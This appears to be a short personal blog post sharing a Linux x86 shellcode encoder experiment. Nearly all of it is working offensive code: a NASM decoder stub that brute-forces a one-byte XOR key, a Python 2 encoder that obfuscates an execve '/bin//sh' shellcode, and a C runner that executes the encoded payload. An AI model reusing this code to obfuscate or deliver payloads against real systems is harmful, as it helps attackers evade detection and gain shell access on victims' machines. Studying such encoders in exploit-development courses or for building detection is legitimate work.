---
title:  "Linux x86 one byte self bruteforcing shellcoder encoder/decoder"
---

I was looking  my old code and I found a shellcode encoder experiment I did some years ago. 


Basically, the encoder takes as input a shellcode, add a NOP opcode (0x90) in front of it, parses it's bytes and generate a set of bytes not used by the shellcode, then it picks one at random. Every shellcode's bytes is the xorred with this key.


The decoder perform a sort of self-bruteforcing: it loops every possible byte and try to XOR it against the first shellcode byte, if the opcode it's == 0x90, the decoder found the key and can start decoding it.


## decoder
```nasm
global _start

section .text
_start:
    jmp short shelly ; JMP CALL POP trick

stub:
    pop esi; address of shellcode in memory 
    xor ecx, ecx ; bytes counter 
    xor eax, eax ; eax = 0

findkey:
    inc ecx     ; ecx loops every possible byte. 
    push ecx    ; save ecx so it can be restored later
    xor cl, byte [esi] ; xor cl with the byte pointed by esi, in other words, with the shellcode byte
    cmp cl, 0x90 ; if cl != 0x90 
    pop ecx      ; restore ecx 
    jne findkey  ; try next byte
    
    ;ELSE key found
    
    mov al, cl ; al stores the correct key     
    mov al, cl 
    mov ah, cl 
    mov bx, ax 
    rol eax, 0x10 
    mov ax, bx  ; each byte of EAX is a the byte-key

    mov cl, len ; cl keeps the length of the shellcode and acts as LOOP decreasing counter 
    

    add esi, ecx ; esi stores the shellcode length 
    dec ecx      ; needed for handling the loop below 
decode:
    dec esi      
    dec esi 
    dec esi
    dec esi      ; in this way ESI points to the correct 4-bytes to decode

    dec ecx      
    dec ecx
    dec ecx      ; needed for handling the loop 

    mov ebx, eax        ; save the key  
    xor eax, [esi]      ; decrypt 4 bytes and save it in EAX
    push eax            ; save decrypted bye
    mov eax, ebx        ; restore the key 
    loop decode         ; decrypt until ECX = 0  
    call esp  ; execute the decrypted shellcode! 

shelly:
    call stub
   ; pase below the encoded bytes with encoder.py 0x28
   shellcode: db 0xb9,0x18,0xe9,0x79,0x41,0x06,0x06,0x5a,0x41,0x41,0x06,0x4b,0x40,0x47,0xa0,0xca,0x79,0xa0,0xcb,0x7a,0xa0,0xc8,0x99,0x22,0xe4,0xa9,0xb9,0xb9,0x29
    len equ $-shellcode 

```

## encoder
```python
#!/usr/bin/python2
import random 
import sys





shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

shellcode = '\x90' + shellcode


#generate a list of all possible bytes 

bytez = bytearray.fromhex(''.join(['%02x' % i for i in range(1,256)]))

#get a list of bytes used by the shellcode 
shellarray = bytearray(shellcode)

padding = (len(shellarray) % 4)
shellcode += '\x90' * padding  
keys =  set(bytez) - set(shellarray)
keys = bytearray(keys)
#select a random key 
key = random.choice(keys)
print("=" *10)
print "decryption key: " ,  hex(key)

print("=" *10)

encoded = ""
encoded2 = ""

#encrypt the shellcode with the random byte-key

for x in bytearray(shellcode) :
    y = x ^ key
    encoded += '\\x'
    encoded += '%02x' % y
    encoded2 += '0x%02x,' %y

#print to screen the encoded shellcode in two formats 
print("=" *10)
print("C version:\n\n ")
print '"' + encoded + '"' + "\n"
print("=" *10)
print("NASM version\n\n")
print encoded2 + '0x%02x' % key + "\n"
print("=" *10)
print 'Len: %d' % len(bytearray(shellcode))
```



## shellcode runner

```c
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\xeb\x35\x5e\x31\xc9\x31\xc0\x41\x51\x32\x0e\x80\xf9\x90\x59\x75\xf6\x88\xc8\x88\xc8\x88\xcc\x66\x89\xc3\xc1\xc0\x10\x66\x89\xd8\xb1\x1d\x01\xce\x49\x4e\x4e\x4e\x4e\x49\x49\x49\x89\xc3\x33\x06\x50\x89\xd8\xe2\xf0\xff\xd4\xe8\xc6\xff\xff\xff\xb9\x18\xe9\x79\x41\x06\x06\x5a\x41\x41\x06\x4b\x40\x47\xa0\xca\x79\xa0\xcb\x7a\xa0\xc8\x99\x22\xe4\xa9\xb9\xb9\x29";

                   
                  int main(void)
{
    fprintf(stdout,"Length: %d\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}

```
